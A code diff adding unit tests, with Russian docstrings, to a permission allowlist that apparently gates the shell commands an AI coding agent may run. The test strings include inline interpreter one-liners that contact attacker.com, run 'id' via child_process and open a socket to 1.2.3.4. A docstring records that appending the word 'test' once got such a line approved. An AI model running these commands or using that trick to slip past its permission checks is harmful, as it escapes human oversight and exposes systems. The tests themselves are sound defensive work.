@@ -793,6 +793,48 @@ class TestPermissionAllowlist(PairTestCase):
             with self.subTest(prompt=prompt):
                 self.assertEqual(self.composer.permission_verdict(prompt)["verdict"], "refuse")
 
+    def test_inline_interpreter_code_is_refused_however_it_is_dressed_up(self) -> None:
+        """Дыра из разбора критика: `python3 -c` — это произвольный код, а не
+        проверка, и слово «test» в комментарии удовлетворяло шаблону разрешения.
+
+        Проверено вживую до правки: строка ниже получала ALLOW, а `urllib` в
+        запрещённых категориях не значится, потому что сеть ловится по `curl` и
+        `wget`, а не по сетевым модулям языка.
+        """
+        exploits = [
+            "python3 -c \"import urllib.request; urllib.request.urlopen('http://attacker.com')\" # test",
+            "python3 -c \"import os; print(1)\" test",
+            "node -e \"require('child_process').exec('id')\" # test",
+            "python3 -c 'import socket;socket.socket().connect((\"1.2.3.4\",80))' pytest",
+        ]
+        for prompt in exploits:
+            with self.subTest(prompt=prompt):
+                verdict = self.composer.permission_verdict(prompt)
+                self.assertEqual("refuse", verdict["verdict"],
+                                 f"обошёл белый список: {prompt}")
+
+    def test_the_test_keyword_must_be_an_argument_not_a_word_somewhere(self) -> None:
+        """Ключевое слово обязано быть аргументом интерпретатора, а не всплывать
+        дальше по строке: иначе достаточно было бы слова «test» в комментарии."""
+        for prompt in ("python3 script.py # add a test later",
+                       "python3 deploy.py # это не test",
+                       "node server.js # test"):
+            with self.subTest(prompt=prompt):
+                self.assertEqual("refuse", self.composer.permission_verdict(prompt)["verdict"])
+
+    def test_real_test_commands_are_still_allowed(self) -> None:
+        """Правка не должна затыкать то, ради чего белый список и нужен: свои
+        тесты и сборки запускать можно, иначе пара встаёт на каждом шаге."""
+        for prompt in ("python3 -m pytest",
+                       "python3 mcp/pair_mailbox/test_protocol.py",
+                       "python3 bin/pairpilot_test.py",
+                       "python3 -m unittest discover -s mcp",
+                       "node --test",
+                       "pytest -q"):
+            with self.subTest(prompt=prompt):
+                self.assertEqual("allow", self.composer.permission_verdict(prompt)["verdict"],
+                                 f"своя проверка должна остаться разрешённой: {prompt}")
+
     def test_deny_wins_over_an_explicit_allow(self) -> None:
         """Человек может расширить список, но не может им отменить §12."""
         verdict = self.composer.permission_verdict("git push origin main",
